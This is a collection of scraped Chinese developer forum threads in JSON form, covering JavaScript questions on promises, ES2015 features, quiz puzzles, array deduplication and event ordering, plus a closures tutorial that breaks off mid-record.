{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我准备在 iPad 上面开发一个 小 APP，离线使用的。<br>\nHybrid App 框架貌似有什么 phoneGap、Ionic 等等~<br>\n我想寻找一个 上手最快、成熟的。大家推荐一个吧。<br>\n我只会 JS（ jQuery ） 、HTML 、CSS 、PHP~</p>\n</div></div>"], "reply": "10", "tittle": "上手最简单、成熟的 Hybrid App（ WebApp）框架是哪个？ 我只会 JS 和 HTML", "comment": ["IONIC", "mui?", "Crosswalk或者Cordova。", "jquery mobile~这个，刚好配合你的jquery~", "最近用的一个企鹅的前端框架不错，不使用本地功能，数据用json值感觉也不错。", "ionic", "framework7", "ionic效果还可以，需要熟悉angular\r", "\r", "framework7 写过简单的，也还行。", "ionic +1", "nativesript, React Native, 国内的有apicloud，这样的app局限性还是很大，访问底层的话，还是需要native － js 间的原生代码。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>actionA, actionB都返回promise。</p>\n\n<p>基本逻辑是，actionA的reject要执行actionB，actionB的resolve要执行actionA，此时actionA再reject就error。</p>\n<div class=\"highlight\"><pre>actionA().then(\n    function(){//resolve\n        //do right thing\n    },\n    function(){ //handle reject\n        actionB().then(function(){\n            actionA().then(function(){\n                //do right thing\n            },function(){\n            //Error Alert from actionA\n           })\n      },function(){\n            //Error Alert from actionB\n     })\n    }\n)\n</pre></div>\n\n<p>怎么使用proxy pattern优化上面的code</p>\n</div></div>", "<div class=\"topic_content\">更改subject：Proxy Promise Pattern ——&gt; Proxy Pattern with promise</div>"], "reply": "7", "tittle": "代码求助，关于 Proxy Promise Pattern 的使用， javascript 的", "comment": ["什么是proxy promise pattern。。。", " 当作是proxy pattern吧，表达不清楚了", "orz 这个代码风格……\r", "建议看看周爱民的这篇文章 -> ", "如果你确保你的do right thing是不会出错的，或者出错也要用一致的逻辑来处理error，那这个逻辑应该是很简单的：\r", "\r", "var a = actionA();\r", "\r", "a.then(doRightThing); // 正确的\r", "\r", "a.catch(actionB) // 出错后调用actionB\r", "    .then(actionA) // 如果actionB成功就继续actionA\r", "    .then(doRightThing) // actionA成功就doRightThing\r", "    .catch(alertError); // 上面无论哪一步失败都处理错误\r", "\r", "重点在一系列的then过程中，任何一个环节出错，错误都会传到最后近的一个catch上去，所以逻辑的处理是线性的而不是嵌套的", " 感谢你的解决方案， 很有启发。\r", "但是，我的问题是可否用proxy pattern来重构我那些垃圾的嵌套代码。", " 不明白你的proxy pattern是指经典OO Design Pattern里的Proxy Pattern么，如果是的话，为何要一开始就把“用Proxy Pattern”这明显是“手段”的东西作为重构的“目标”呢？所谓重构不就是保证正确性的前提下把代码理得更顺更易读吗，既然原来Promise就可以达到这样的目标，为何还要引入其它的Pattern", " 因为在actionB里的resolve还要call actionA，这样嵌套的代码很不雅。看到proxy可以解决这一的问题，但是不知道怎么写code"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>两个月前就开始准备的ES2015（原名ECMA Script 6）的技术分享，正值ES6规范正式定稿之际（完全是巧合，哈哈），在上周五的时候，给组内做了次技术分享，其中涵盖了比较能说明新特性的若干例子。</p>\n\n<p>介绍了新版本规范的若干新特性：</p>\n\n<ul>\n<li>Arrows function</li>\n<li>default + reset + spread</li>\n<li>let + const</li>\n<li>Classes</li>\n<li>Map + Set</li>\n<li>Destructuring</li>\n<li>String</li>\n<li>Modules</li>\n<li>Iterators</li>\n<li>Symbols</li>\n<li>Enhanced Object Literals</li>\n</ul>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://caichao.me/%E5%89%8D%E7%AB%AF/2015/06/23/es2015/\">http://caichao.me/前端/2015/06/23/es2015/</a></p>\n</div></div>", "<div class=\"topic_content\">PDF已更新，开头图片不会挡住文字了。\r<br>下面朋友们提的问题，在被挡住的内容中已有提及。\r<br>babel如何使用的例子（向导）\r<br><a target=\"_blank\" href=\"https://babeljs.io/docs/setup/\" rel=\"nofollow\">https://babeljs.io/docs/setup/</a></div>"], "reply": "20", "tittle": "上周给组内做的一个 ES2015 的技术分享，这里同时放个 PDF 分享下", "comment": ["赞一个先！", "谢谢分享，学习了 :)", "之前一直期待ES6，但直到这个PDF才认真地了解一次：）\r", "真是令人兴奋的ES6啊", "赞一个，如果大家的浏览器都能迅速支持新标准就好了。。", "看了一下，很多概念跟 Python 很类似。\r", "\r", "但是下面这个例子就不理解了，为啥加了个括号就 OK 了？\r", "\r", " ", "  前端就别想尽快支持了，5.1都支持不全，老版本浏览器淘汰得一些年，但是后端node可以尽快用上", "汽车之家", "大赞！", "  keynote生成PDF，可以选择每个动画生成一页的，第三页图片挡住了文字，看不到了，泪奔", " @", " 可以用 babel 编译一下 ", " 我觉得楼主这里应该是搞错了\r", "\r", "不带括号的形式，不论是 Chrome Developer Tools、Firefox Web Console 还是 Babel REPL，报的错都是 SyntaxError，因为此处 {x: a} 解析起来有歧义，可能是 block statement 也可能是 object literal\r", "\r", "而套了括号之后，这一行能够被确定为是 expression statement，所以可以被解析，但是严格模式下仍然会出错（ReferenceError，严格模式禁止隐式创建全局变量）（不过 Chrome 非严格模式下也报 Uncaught ReferenceError: Invalid left-hand side in assignment 错误，不太明白……）\r", "\r", "这个 trick 在 ES6 之前也有的\r", "\r", " 前端可以用 babel 嘛", " 括号这里，其实我也没搞明白，某个系统教程中的例子里特别提到了这么一个特殊的括号，然而那篇文章中也没有给个正确的解释，so...\r", "\r", "多谢", " \r", " \r", "原来如此，多谢指点...\r", "Babel 我也来关注下", "学习了。。", "用ES6规范编写的能编译出兼容的ES5的代码么。", " 用babel\r", "官网有例子，其适应性超高\r", "谢谢分享", " \r", " \r", "\r", "同意11楼的，这里是楼主搞错了\r", "这里出现的是语法错误，和 a 是否有定义完全无关\r", "\r", "因为 ES 解释器在这个上下文中遇到左大括号，优先解释为块定义，而不是 Object literal；而如果前面加了小括号，就会强制解释为 Object literal 了。\r", "\r", "看看这个\r", "```\r", "{a:x}\r", "ReferenceError: x is not defined //-- 这是楼主误以为报错的原因，但实际不是他想的那样\r", "\r", "x=1\r", "1\r", "\r", "{a:x}\r", "1 //-- 这里没有出现语法错的，是因为 a: 被解释成 label 了\r", "\r", "{x}\r", "1 //-- 没有 label 结果也是一样的\r", "\r", "({a:x})\r", "Object { a: 1 } //-- 加了括号，看出来区别了吧\r", "\r", "{x}\r", "Object { x: 1 } //-- 这是 object literal 的新语法\r", "```\r", "\r", "另外，ppt 里面还有个拼写错误，就是对应上面的 object literal 新语法的\r", "```\r", "￼var obj = {\r", "￼￼￼￼￼￼￼    // hander: hander 的简写 ------- 拼写错误\r", "    ￼￼handler\r", ", };\r", "￼￼```", "更正一下\r", "上面最后一个 {x} 漏了打括号了\r", "应该是({x})", " 明白了！多谢指正！\r", "{x:a}这里，a是point中没有的keyname，所以x没有被赋值\r", "()后强制解释成object就能拿到了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.ecma-international.org/publications/standards/Ecma-262.htm\">http://www.ecma-international.org/publications/standards/Ecma-262.htm</a></p>\n</div></div>"], "reply": "23", "tittle": "ECMAScript 2015 正式版发布", "comment": ["标题写成“ECMAScript 6 规范完成”更好吧？", " 确实，标题我是看不懂！", " 确实，标题我是看不懂！+1", " @", " \r", "那篇文章的主标题翻译过来是 “ECMAScript(R) 2015 语言规范”\r", "但是内容却是 ECMAScript 6 规范完成 并标准化为 ISO/IEC 16262:2016\r", "\r", "（如果理解存在偏差请指出", "hn 上的讨论蛮有趣 ", "·ECMAScript 6, also known as ECMAScript 2015· 题目没啥好纠结的", " 不符合TA们的线性思考", " \r", "\r", "\r", " \r", " \r", " \r", " \r", "ES6也称为ES2015啊，并没有错", " @", " @", "  这是 ECMAScript 规范的第六个版本，但这个规范的正式名字已经改成了 ECMAScript 2015 了，所以标题并没有问题。\r", "关于规范改名，ES DISCUSS 上有提到过的 -> ", "这玩意这么久了还没成成形？", "天天变，难怪前端难找", "好棒，标准终于定下来了。那么前端通过 babel 等东西直接转换到 ES5 就非常方便了。ES6 的 import 似乎很好模块化，很想看到除了 Ember.js 之外的 ES6 实践。", " 为什么要改名成这个？ 有什么八卦吗", "明天讲课就是这 :D", "起夜急语言了", "import xx from oo 是不是跟python学的?", " 我给的链接里就是社区的讨论以及当时的会议记录……标准委员会现在是准备一年出一个版本的节奏，所以干脆以年份命名了", "因为明年就标准化 ES2016 了", "ES6 的 destructuring assignment 还是很好用的，希望 nodejs 或者 iojs 能早点支持……\r", "\r", "像 `let {readFile, rename} = require('fs');` 这种，感觉代码能稍微清晰一些吧？", "  不敢苟同，雖然我也是Scala粉，但這種引入語法看起來並不如ES2015的好", " 啊，之前说的正是 ES2015 （之前叫做ES6）的语法，是已经确定好的规范。静琴只是想说希望 nodejs 早日支持规范中的该语法而已。详细的语法说明可以看这里[1]，也有可以参考MDN上的介绍[2]。\r", "\r", "[1] ", "\r", "[2] ", "初步看了下，好多和python相似，数组结构 默认参数。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>丰厚股权激励（30%股票池未分配），薪资在目前水平上浮20%+，CTO直招，BAT全栈技术大牛带队</p>\n\n<p>工作职责：<br>\n1. 互联网O2O平台前端开发<br>\n2. 微信公共号平台开发</p>\n\n<p>期望：<br>\n1. 本科以上计算机相关学历，1年以上开发工作经验；<br>\n2. 掌握HTML/CSS/Javascript等前端基础技术，熟悉HTTP协议，有Mobile Web及响应式Web开发经验者优先；<br>\n3. 至少掌握一种前端js框架如jquery、angular、backbone，熟悉MV*和组件式前端架构者优先；<br>\n4. 有REST网站或后端开发经验者优先；<br>\n5. 精通NodeJS的Javascript全栈工程师优先（如MEAN全栈）；<br>\n6. 至少掌握一种前端CSS框架如BootStrap、Foundation、Semantic UI，有UE能力者优先；<br>\n7. 有电商、O2O或SAAS平台开发经验者优先；<br>\n8. 有良好的学习精神、技术追求和抗压能力和创业激情者优先。</p>\n</div></div>"], "reply": "8", "tittle": "互联网+企业服务创业公司招聘前端大牛", "comment": ["有意者微信联系 laubersder，或邮件 ", "……所以是在哪？", "薪资有点诱人，帮我付了违约金好不好", " 朝阳区东大桥世贸天街附近", " 如果符合我们条件当然可以", "\"抗压能力和创业激情\" == \"加班\"", " 这就是一惯例用语", " 什么公司"]},
{"content": ["<div class=\"topic_content\">有DOM0级事件处理器和DOM2级事件处理器，为什么没有DOM1级事件处理器？</div>"], "reply": "3", "tittle": "DOM1 级去哪了？", "comment": ["印象中JavaScript是DOM0级后，在升级DOM1级时，是没有增加事件功能的；在DOM2级的时候，发现以前的事件罩不住了才加的DOM2级事件；DOM0级是直接定义在元素私有属性上的。2级定义在.__proto__.__proto__.__proto__.__proto__.__proto__.addEventListener上；JS加功能，是往以前同类功能的原型上写的，你可以在元素的原型上查一下就知道DOM0 DOM1 DOM2了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个面试题:<br>\n假设某个div的css为 .selector{transform:translateY(-500px)}<br>\n现在随着页面的滚动(自上而下),将-500逐渐变成0.变成0的过程中,停止滚动,则数值停止变化.<br>\n想了想,如果用$(\".selector\").css({\"transform\":\"translateY(\"+($(window).scrollTop()-500)+\"px)\"});会出现超过0的值.<br>\n不知道大家有更好的方法没?</p>\n</div></div>"], "reply": "2", "tittle": "随着页面滚动改变 translateY 的值", "comment": ["是要这样？ Math.max($(window).scrollTop()-500, 0)", "看错, -500就改成 Math.min"]},
{"content": ["<div class=\"topic_content\">谢谢啊</div>"], "reply": "3", "tittle": "请大家推荐一个 js 库能比较方便的模拟分子的运动？", "comment": ["3D的吗？你是有自己的模型资源是吗？ three.js你可以看下", "\r", "\r", "同楼上", "不是习惯上用 CASTEP 么，虽然是商业软件"]},
{"content": ["<div class=\"topic_content\">see <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2015/04/tail-call.html\" rel=\"nofollow\">http://www.ruanyifeng.com/blog/2015/04/tail-call.html</a></div>"], "reply": "1", "tittle": "尾调用优化", "comment": ["\r", "这篇讲得更清楚一点"]},
{"content": ["<div class=\"topic_content\">```javascript\r<br>function Bird(){\r<br>    this.name = 'asaa';\r<br>    this.say = function (){\r<br>        return (this.name + 'hi!')\r<br>    }\r<br>}\r<br>\r<br>var bob = new Bird;\r<br>var bob2 = new Bird();\r<br>bob.name;\r<br>bob2.name;\r<br>```\r<br>\r<br>结果相同，但是加括号和不加有区别吗。如果是某些语言，加括号才能实例化。</div>"], "reply": "11", "tittle": "var instance = new func; 和 new func()有区别吗？", "comment": ["javascript，在构造函数无需参数的情况下，是无区别的。如果需要参数，就需要括号。一般情况下，加上括号保证代码风格统一。", "你的标题和内容不符嘛。", "同意1L", "就上面的代码来说没区别，但有时候会有区别，比如\r", "\r", "var toString = new Number.toString; // TypeError\r", "var toString = new Number().toString; // [Function: toString]", "这个都是访问对象里的name属性把？", "有区别，带()表示的是函数的运行结果，不带()表示的是函数本身，这样理解就可以了\r", "\r", "参考一本很老但是对很多概念讲解很细致、易懂的书籍：JavaScript DOM高级程序设计", "P.S. @", " 的代码第一行改成 (new Number).toString 就好了~", " 不过就楼主的问题来看这样说似乎并不恰当，new是创建一个实例，其实并不运行函数", " 用 new 操作时，不带 () 也会运行函数的，你可以试试。\r", "1楼是正解", " new 并不是运行函数", " \r", " \r", " \r", "\r", "你们是对的…昨天没仔细看T_T\r", "我说的该是没有new的情况，这里不恰当"]},
{"content": ["<div class=\"topic_content\">1. \"1\" - - \"1\";\r<br>2. new Array(5).toString();\r<br>3. \r<br>var x = 0;\r<br>function foo() {\r<br>    x++;\r<br>    this.x = x;\r<br>    return foo;\r<br>}\r<br>var bar = new new foo;\r<br>console.log(bar.x);\r<br>4.\r<br>var bar = 1,\r<br>    foo = {};\r<br>\r<br>foo: {\r<br>    bar: 2;\r<br>    baz: ++bar;\r<br>};\r<br>foo.baz + foo.bar + bar;\r<br>5.\r<br>function foo(a, b) {\r<br>    arguments[1] = 2;\r<br>    console.log(b);\r<br>}\r<br>foo(1);\r<br>6. (true + false) &gt; 2 + true;</div>"], "reply": "17", "tittle": "JAVASCRIPT 专业四级：这几个问题，你会做几个？", "comment": ["chrome console加google终于弄明白了。。。感谢楼主分享", "反对任何滥用语言的灵活性，生产环境写这种东西真的是作死", "第六题还能这么玩......", "这种应试题有什么意义么？", "然并卵", "格式太差。。。。", "会写二叉树嘛", "有没有专业六级的", " \r", "\r", "专业八级\r", "\r", " 跪了", "楼主把下面这段JavaScript代码解释一遍再说吧：\r", "\r", "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()", "反转二叉树。。", "想起了之前姬友拿来问我的一道题，好象是给了个i的初始值，问i+++i+++i返回值多少，i是多少……\r", "然后标准答案里大谈特谈分析了一通给了一个答案，然后我淡定地扔到gcc和VC6.0和VS里一编译，给的结果都不一样……", " 同意, 纯粹嘬死", "把有限的生命投入到无限的brain f**k中~", "TUT", "工作中不会这样写吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>通过如下小脚本我希望是去掉JS array中重复的Object，但每次将元素放进hash的时候，key都变成了 '[object Object]'，最终导致没有拿到预期的输出，思路应该没有问题，改怎么解决呢？请大人指点一二，谢谢先!</p>\n<div class=\"highlight\"><pre><span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"p\">[</span> <span class=\"p\">{</span> <span class=\"nx\">a</span><span class=\"o\">:</span> <span class=\"s1\">'A'</span> <span class=\"p\">},</span> <span class=\"p\">{</span> <span class=\"nx\">b</span><span class=\"o\">:</span> <span class=\"s1\">'B'</span> <span class=\"p\">},</span> <span class=\"p\">{</span> <span class=\"nx\">a</span><span class=\"o\">:</span> <span class=\"s1\">'A'</span> <span class=\"p\">}</span> <span class=\"p\">];</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">);</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">hash</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"nx\">len</span> <span class=\"o\">=</span> <span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">len</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">elem</span> <span class=\"o\">=</span> <span class=\"nx\">a</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">];</span>\n  <span class=\"nx\">hash</span><span class=\"p\">[</span><span class=\"nx\">elem</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">elem</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">noDuplicate</span> <span class=\"o\">=</span> <span class=\"p\">[],</span> <span class=\"nx\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">item</span> <span class=\"k\">in</span> <span class=\"nx\">hash</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nx\">noDuplicate</span><span class=\"p\">[</span><span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">hash</span><span class=\"p\">[</span><span class=\"nx\">item</span><span class=\"p\">];</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">hash</span><span class=\"p\">);</span> <span class=\"c1\">// { '[object Object]': { a: 'A' } }</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">noDuplicate</span><span class=\"p\">);</span> <span class=\"c1\">// [ { a: 'A' } ]</span>\n\n<span class=\"c1\">// expected: [ { a: 'A' }, { b: 'B' } ]</span>\n</pre></div>\n\n<p>p.s. 为什么要支持markdown格式只能发帖后在编辑中才能选择...</p>\n</div></div>"], "reply": "5", "tittle": "利用 hash 去掉 JS array 中重复的 Object", "comment": ["第一个for循环中的一次操作是：\r", "var elem = a[0]; //{a:'A'}\r", "hash[{a:'A'}] = {a:'A'}", "对象的.toString() 返回就是 [object Object]了，你想获取对象字符串就用 JSON.stringify()  吧", "hash[elem] = elem换成hash[JSON.stringify(elem)] = elem\r", "不过应该有更好的方法吧", " \r", " \r", "果然两位的方法有效！感谢!", "1. 考虑 JSON.stringify\r", "```\r", "var a = [ { a: 'A' }, { b: 'B' }, { a: 'A' } ]\r", "\r", "// obj --> str --> filtered str --> obj\r", "var noDuplicate = a\r", "    .map(function(obj) {\r", "        return JSON.stringify(obj)\r", "    })\r", "    .filter(function(str, idx, a) {\r", "        return idx === a.indexOf(str)\r", "    })\r", "    .map(function(str) {\r", "        return JSON.parse(str)\r", "    })\r", "```\r", "\r", "2. 使用 lodash 的 _.isEqual() 方法\r", "```\r", "var a = [ { a: 'A' }, { b: 'B' }, { a: 'A' } ]\r", "var noDuplicate = a.reduce(function(arr, obj) {\r", "    if (arr.some(function(chosen) {\r", "        return _.isEqual(chosen, obj)\r", "    })) return arr\r", "    arr.push(obj)\r", "    return arr\r", "}, [])\r", "```\r", "\r", "JSON.stringify 不能处理所有对象（循环引用、undefined、method），\r", "_.isEqual 更健壮，不过性能就呵呵了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问哪个先执行呢？如果是事件默认行为先执行，那为什么可以使用preventDefault（），returnValue=false等方式阻止默认行为呢？</p>\n</div></div>"], "reply": "4", "tittle": "js 事件处理函数和事件默认行为的执行先后问题", "comment": ["事件冒泡模型\r", "see ", " 谢谢你，事件冒泡我知道，但是和这个好像没关系呀？比如点击一个checkbox，是先勾选它还是先执行事件处理程序？", "先上规范：\r", "\r", "\r", "大部分情况下EventListener先执行，规范上有写：\r", "Default actions should be performed after the event dispatch has been completed, but in exceptional cases may also be performed immediately before the event is dispatched.\r", "\r", "接着举了一个例子，就是checkbox的例子：\r", "The default action associated with the click event on <input type=\"checkbox\"> elements toggles the checked IDL attribute value of that element. If the click event's default action is cancelled, then the value is restored to its former state.", "  十分感谢！我试了一下，同样存在这个问题的还有单选按钮"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.rainy.im/2015/07/04/scope-chain-and-prototype-chain-in-js/\">&gt;&gt; 原文 &lt;&lt;</a></p>\n\n<p>本文尝试阐述Javascript中的上下文与作用域背后的机制，主要涉及到执行上下文（execution context）、作用域链（scope chain）、闭包（closure）、<code>this</code>等概念。</p>\n\n<h2>Execution context</h2>\n\n<p>执行上下文（简称上下文）决定了Js执行过程中可以获取哪些变量、函数、数据，一段程序可能被分割成许多不同的上下文，每一个上下文都会绑定一个变量对象（variable object），它就像一个容器，用来存储当前上下文中所有已定义或可获取的变量、函数等。位于最顶端或最外层的上下文称为全局上下文（global context），全局上下文取决于执行环境，如Node中的<code>global</code>和Browser中的<code>window</code>：</p>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-global-context.jpg\" alt=\"js global context\"></p>\n\n<p>需要注意的是，上下文与作用域（scope）是不同的概念。Js本身是单进程的，每当有function被执行时，就会产生一个新的上下文，这一上下文会被压入Js的上下文堆栈（context stack）中，function执行结束后则被弹出，因此Js解释器总是在栈顶上下文中执行。在生成新的上下文时，首先会绑定该上下文的变量对象，其中包括<code>arguments</code>和该函数中定义的变量；之后会创建属于该上下文的作用域链（scope chain），最后将<code>this</code>赋予这一function所属的Object，这一过程可以通过下图表示：</p>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-context-stack.jpg\" alt=\"js context stack\"></p>\n\n<h2>this</h2>\n\n<p>上文提到<code>this</code>被赋予function所属的Object，具体来说，当function是定义在global对中时，<code>this</code>指向global；当function作为Object的方法时，<code>this</code>指向该Object：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">f</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">x</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">f</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 1</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">ff</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"mi\">2</span><span class=\"p\">;</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">x</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">ff</span><span class=\"p\">();</span> <span class=\"c1\">// -&gt; 2</span>\n<span class=\"nx\">x</span>     <span class=\"c1\">// -&gt; 2</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"nx\">x</span><span class=\"o\">:</span> <span class=\"s2\">\"o's x\"</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"o\">:</span> <span class=\"nx\">f</span><span class=\"p\">};</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">f</span><span class=\"p\">();</span> <span class=\"c1\">// \"o's x\"</span>\n</pre></div>\n\n<h2>Scope chain</h2>\n\n<p>上文提到，在function被执行时生成新的上下文时会先绑定当前上下文的变量对象，再创建作用域链。我们知道function的定义是可以嵌套在其他function所创建的上下文中，也可以并列地定义在同一个上下文中（如global）。作用域链实际上就是自下而上地将所有嵌套定义的上下文所绑定的变量对象串接到一起，使嵌套的function可以“继承”上层上下文的变量，而并列的function之间互不干扰：</p>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-scope-chain.jpg\" alt=\"js scope chain\"></p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"s1\">'global'</span><span class=\"p\">;</span>\n<span class=\"kd\">function</span> <span class=\"nx\">a</span><span class=\"p\">(){</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"s2\">\"a's x\"</span><span class=\"p\">;</span>\n  <span class=\"kd\">function</span> <span class=\"nx\">b</span><span class=\"p\">(){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">y</span> <span class=\"o\">=</span> <span class=\"s2\">\"b's y\"</span><span class=\"p\">;</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">x</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n  <span class=\"nx\">b</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n<span class=\"kd\">function</span> <span class=\"nx\">c</span><span class=\"p\">(){</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"s2\">\"c's x\"</span><span class=\"p\">;</span>\n  <span class=\"kd\">function</span> <span class=\"nx\">d</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">y</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n  <span class=\"nx\">d</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">a</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; \"a's x\"</span>\n<span class=\"nx\">c</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; ReferenceError: y is not defined</span>\n<span class=\"nx\">x</span>     <span class=\"c1\">// -&gt; \"global\"</span>\n<span class=\"nx\">y</span>     <span class=\"c1\">// -&gt; ReferenceError: y is not defined</span>\n</pre></div>\n\n<h2>Closure</h2>\n\n<p>如果理解了上文中提到的上下文与作用域链的机制，再来看闭包的概念就很清楚了。每个function在调用时会创建新的上下文及作用域链，而作用域链就是将外层（上层）上下文所绑定的变量对象逐一串连起来，使当前function可以获取外层上下文的变量、数据等。如果我们在function中定义新的function，同时将内层function作为值返回，那么内层function所包含的作用域链将会一起返回，即使内层function在其他上下文中执行，其内部的作用域链仍然保持着原有的数据，而当前的上下文可能无法获取原先外层function中的数据，使得function内部的作用域链被保护起来，从而形成“闭包”。看下面的例子：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"mi\">100</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">inc</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">x</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">return</span> <span 